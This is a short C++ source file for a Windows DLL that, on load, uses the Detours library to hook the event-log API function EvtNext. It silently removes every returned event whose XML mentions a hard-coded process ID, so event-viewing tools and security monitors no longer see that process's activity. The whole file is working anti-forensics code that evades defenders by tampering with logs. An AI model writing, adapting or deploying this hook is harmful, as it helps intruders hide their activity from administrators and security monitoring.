// dllmain.cpp : Defines the entry point for the DLL application.
#include "pch.h"
#include <Windows.h>
#include <winternl.h>
#include <winevt.h>
#include "detours.h"
#include <string>

#pragma comment(lib, "wevtapi.lib")

typedef BOOL(WINAPI* realEvtNext)(
    EVT_HANDLE Event,
    DWORD       EventsSize,
    PEVT_HANDLE Events,
    DWORD       Timeout,
    DWORD       Flags,
    PDWORD      Returned);

realEvtNext _realEvtNext = (realEvtNext)GetProcAddress(GetModuleHandleA("wevtapi.dll"), "EvtNext");

LPWSTR eventXML(EVT_HANDLE hEvent)
{
    DWORD status = ERROR_SUCCESS;
    DWORD dwBufferSize = 0;
    DWORD dwBufferUsed = 0;
    DWORD dwPropertyCount = 0;
    LPWSTR pRenderedContent = NULL;

    if (!EvtRender(NULL, hEvent, EvtRenderEventXml, dwBufferSize, pRenderedContent, &dwBufferUsed, &dwPropertyCount))
    {
        if (ERROR_INSUFFICIENT_BUFFER == (status = GetLastError()))
        {
            dwBufferSize = dwBufferUsed;
            pRenderedContent = (LPWSTR)malloc(dwBufferSize);
            if (pRenderedContent)
            {
                EvtRender(NULL, hEvent, EvtRenderEventXml, dwBufferSize, pRenderedContent, &dwBufferUsed, &dwPropertyCount);
            }
            else
            {
                status = ERROR_OUTOFMEMORY;
            }
        }
    }

    return pRenderedContent;

}

BOOL _evtNext(
    EVT_HANDLE ResultSet,
    DWORD       EventsSize,
    PEVT_HANDLE Events,
    DWORD       Timeout,
    DWORD       Flags,
    PDWORD      Returned)
{

    DWORD status = ERROR_SUCCESS;
    DWORD dwBufferSize = 0;
    DWORD dwBufferUsed = 0;
    DWORD dwPropertyCount = 0;
    LPWSTR pRenderedContent = NULL;

    BOOL s = _realEvtNext(ResultSet, EventsSize, Events, Timeout, Flags, Returned);

    DWORD r = Returned[0];

    if (s == FALSE) {
        return s;
    }

    for (DWORD i = 0; i < r; i++)
    {
       
        LPWSTR xml = eventXML((EVT_HANDLE)Events[i]);

        if (xml != NULL) {
            std::wstring ws(xml);
            if (ws.find(L"ProcessID='6036'") != std::wstring::npos) {
                OutputDebugString(L"Find Process!");
                EvtClose(Events[i]);
                Events[i] = NULL;

            }

            free(xml);
        }
       
       
    }

    return s;
}



void attachDetours() {

    DetourRestoreAfterWith();
    DetourTransactionBegin();
    DetourUpdateThread(GetCurrentThread());

    DetourAttach((PVOID*)&_realEvtNext, _evtNext);
  
    DetourTransactionCommit();
}

void deAttachDetours() {

    DetourTransactionBegin();
    DetourUpdateThread(GetCurrentThread());

    DetourDetach((PVOID*)&_realEvtNext, _evtNext);

    DetourTransactionCommit();
}

BOOL APIENTRY DllMain(HMODULE hModule,
    DWORD  ul_reason_for_call,
    LPVOID lpReserved
)
{

    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        attachDetours();
        break;
    case DLL_PROCESS_DETACH:
        deAttachDetours();
        break;
    }
    return TRUE;
}

